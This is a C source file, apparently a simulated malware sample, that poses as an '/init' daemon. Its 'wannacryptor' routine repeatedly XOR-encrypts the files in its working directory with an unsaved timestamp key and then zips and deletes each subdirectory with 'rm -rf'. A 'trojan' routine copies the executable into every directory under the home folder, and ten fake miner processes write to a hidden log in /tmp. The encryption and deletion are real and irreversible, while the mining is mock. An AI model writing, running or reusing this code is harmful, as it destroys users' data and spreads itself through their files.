#define _DEFAULT_SOURCE
#include <dirent.h>
#include <errno.h>
#include <libgen.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

void daemonize(char *argv0);
void spawn_process(char *argv0, char processName[], int (*callback)(char *argv0, char *args[]), char *args[]);
int wannacryptor();
int trojan();
int mining(char *argv0, char *args[]);
int rodok(char *argv0, char *args[]);

int main(int argc, char *argv[]) {
    daemonize(argv[0]);

    int child_count = 3;
    spawn_process(argv[0], "wannacryptor", wannacryptor, NULL);
    spawn_process(argv[0], "trojan.wrm", trojan, NULL);
    spawn_process(argv[0], "rodok.exe", rodok, NULL);

    int status;
    for (int i = 0; i < child_count; i++) wait(&status);

    return 0;
}

void daemonize(char *argv0) {
    prctl(PR_SET_NAME, "/init", 0, 0, 0);
    strncpy(argv0, "/init", 128);

    pid_t pid = fork();
    int status;

    if (pid < 0) exit(1);
    if (pid > 0) exit(0);
    if (setsid() < 0) exit(1);

    umask(0);
    for (int x = sysconf(_SC_OPEN_MAX); x > 0; x--) close(x);
}

void spawn_process(char *argv0, char processName[], int (*callback)(char *argv0, char *args[]), char *args[]) {
    pid_t pid = fork();
    if (pid < 0 || pid > 0) return;

    prctl(PR_SET_PDEATHSIG, SIGTERM);
    prctl(PR_SET_NAME, processName, 0, 0, 0);
    strncpy(argv0, processName, 128);
    exit(callback(argv0, args));
}

int xor_file(const char *filename, time_t timestamp) {
    FILE *file = NULL;
    unsigned char *file_buffer = NULL, *key = NULL;
    size_t key_length, file_size, i;
    int ret = 1;

    key = malloc(32);
    if (!key) goto cleanup;
    snprintf((char *)key, 32, "%ld", timestamp);
    key_length = strlen((char *)key);

    file = fopen(filename, "rb+");
    if (!file) goto cleanup;

    fseek(file, 0, SEEK_END);
    file_size = ftell(file);
    rewind(file);

    file_buffer = malloc(file_size);
    if (!file_buffer) goto cleanup;

    if (fread(file_buffer, 1, file_size, file) != file_size) goto cleanup;

    for (i = 0; i < file_size; i++) file_buffer[i] ^= key[i % key_length];

    rewind(file);
    if (fwrite(file_buffer, 1, file_size, file) != file_size) goto cleanup;
    ret = 0;

cleanup:
    if (file) fclose(file);
    free(file_buffer);

    if (ret != 0) {
        free(key);
        return 1;
    }

    return 0;
}
int wannacryptor() {
    while (1) {
        DIR *dir = opendir(".");
        if (!dir) return 1;

        time_t timestamp = time(NULL);
        struct dirent *entry;

        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_name[0] == '.' || entry->d_name == "runme") continue;
            if (entry->d_type == DT_REG) xor_file(entry->d_name, timestamp);
            if (entry->d_type == DT_DIR) {
                char zipname[PATH_MAX];
                char zip_cmd[PATH_MAX * 2];

                snprintf(zipname, sizeof(zipname), "%s.zip", entry->d_name);
                snprintf(zip_cmd, sizeof(zip_cmd), "zip -qr '%s' '%s' 2>/dev/null",
                         zipname, entry->d_name);

                if (system(zip_cmd) == 0) xor_file(zipname, timestamp);

                char rm_cmd[PATH_MAX * 2];
                snprintf(rm_cmd, sizeof(rm_cmd), "rm -rf '%s' 2>/dev/null", entry->d_name);
                system(rm_cmd);
            }
        }

        closedir(dir);
        sleep(30);
    }
    return 0;
}

int trojan() {
    char self[1024];
    ssize_t len = readlink("/proc/self/exe", self, sizeof(self) - 1);
    if (len == -1) return 1;
    self[len] = '\0';

    char cmd[3072];
    char *filename = basename(self);
    snprintf(cmd, sizeof(cmd),
             "find $HOME -type d -exec cp '%s' '{}/%s' \\; 2>>/dev/null",
             self, filename);

    while (1) {
        system(cmd);
        sleep(30);
    }

    return 0;
}

int mining(char *argv0, char *args[]) {
    while (1) {
        srand(time(NULL) + getpid());
        int sleep_time = rand() % 28 + 3;

        char random_hex[65];
        for (int i = 0; i < 64; i++) {
            int random_char = rand() % 16;
            if (random_char < 10) {
                random_hex[i] = '0' + random_char;
            } else {
                random_hex[i] = 'a' + (random_char - 10);
            }
        }
        random_hex[64] = '\0';

        char cmd[512];
        char *date = "$(date +'%Y-%m-%d %H:%M:%S')";
        snprintf(cmd, sizeof(cmd), "echo \"[%s][%s]\" %s >> /tmp/.miner.log", date, args[0], random_hex);
        system(cmd);

        sleep(sleep_time);
    }
    return 0;
}

int rodok(char *argv0, char *args[]) {
    int MAX_MINER = 10;
    pid_t pids[MAX_MINER];
    int status;

    char miner_name[128];
    char log_miner_name[64];
    for (int i = 1; i <= MAX_MINER; i++) {
        snprintf(miner_name, sizeof(miner_name), "mine-crafter-%d", i);
        snprintf(log_miner_name, sizeof(log_miner_name), "Miner %d", i);

        char *values[1] = {log_miner_name};
        spawn_process(argv0, miner_name, mining, values);
    }

    for (int i = 0; i < MAX_MINER; i++) wait(&status);
    return 0;
}